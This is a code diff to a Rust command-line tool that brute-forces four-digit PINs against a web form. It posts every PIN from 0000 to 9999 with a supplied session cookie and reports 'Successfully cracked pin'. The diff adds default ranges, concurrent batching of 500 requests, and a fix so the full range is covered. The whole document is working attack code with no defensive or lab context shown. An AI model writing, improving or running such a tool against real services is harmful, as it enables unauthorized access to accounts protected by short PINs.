@@ -22,46 +22,48 @@ struct Args {
     cookie: String,
     #[clap(long)]
     data_no_pin: String,
-    #[clap(long)]
+    #[clap(long, default_value_t = 0)]
     start: u32,
-    #[clap(long)]
+    #[clap(long, default_value_t = 9999)]
     end: u32,
+    #[clap(long, default_value_t = 500)]
+    pin_chunk_size: usize,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
     let args = Args::parse();
     let pins = create_4_digit_pins(args.start, args.end)?;
-    let try_pin_futures: Vec<_> = pins
-        .into_iter()
-        .map(move |pin| {
-            try_pin(
-                args.referer.clone(),
-                args.user_agent.clone(),
-                args.cookie.clone(),
-                args.data_no_pin.clone(),
-                pin,
-            )
-        })
-        .collect();
-    let results: Vec<_> = future::join_all(try_pin_futures)
-        .await
-        .into_iter()
-        .filter_map(|result| result.ok())
-        .collect();
-    for result in results {
-        if result.valid {
-            println!("Successfully cracked pin: {}", result.pin);
-            return Ok(());
+
+    let referer = args.referer.as_str();
+    let user_agent = args.user_agent.as_str();
+    let cookie = args.cookie.as_str();
+    let data_no_pin = args.data_no_pin.as_str();
+    for pins_chunk in pins.chunks(args.pin_chunk_size) {
+        let pins_chunks_futures: Vec<_> = pins_chunk
+            .into_iter()
+            .map(move |pin| try_pin(referer, user_agent, cookie, data_no_pin, pin.as_str()))
+            .collect();
+        let results: Vec<_> = future::join_all(pins_chunks_futures)
+            .await
+            .into_iter()
+            .filter_map(|result| result.ok())
+            .collect();
+        for result in results {
+            if result.valid {
+                println!("Successfully cracked pin: {}", result.pin);
+                return Ok(());
+            }
         }
+        println!("Failed to crack pin for chunk: {:?}", pins_chunk)
     }
-    println!("Failed to crack pin");
+    println!("Failed to crack pin for all chunks");
     Ok(())
 }
 
 fn create_4_digit_pins(start: u32, end: u32) -> Result<Vec<String>, Box<dyn Error>> {
     let mut pins: Vec<String> = vec![];
-    for i in start..end {
+    for i in start..=end {
         let pin = format!("{:0>4}", i.to_string());
         pins.push(pin.to_string());
     }
@@ -69,18 +71,18 @@ fn create_4_digit_pins(start: u32, end: u32) -> Result<Vec<String>, Box<dyn Erro
 }
 
 async fn try_pin(
-    referer: String,
-    user_agent: String,
-    cookie: String,
-    data_no_pin: String,
-    pin: String,
+    referer: &str,
+    user_agent: &str,
+    cookie: &str,
+    data_no_pin: &str,
+    pin: &str,
 ) -> Result<TryPinResult, Box<dyn Error>> {
     println!("Request initiated for pin: {}", pin);
     let client = Client::new();
     let replaced_pin = data_no_pin.replace("{pin}", &pin);
     let resp = client
-        .post(&referer)
-        .header("Referer", &referer)
+        .post(referer)
+        .header("Referer", referer)
         .header("User-Agent", user_agent)
         .header(
             "Accept",
@@ -96,7 +98,7 @@ async fn try_pin(
         .await?;
     println!("Requested for pin: {}", pin);
     if resp.status() != 200 {
-        return Err("Not 200 code".into());
+        return Err("Non-200 code from pin request".into());
     }
 
     let body = resp.text().await?;
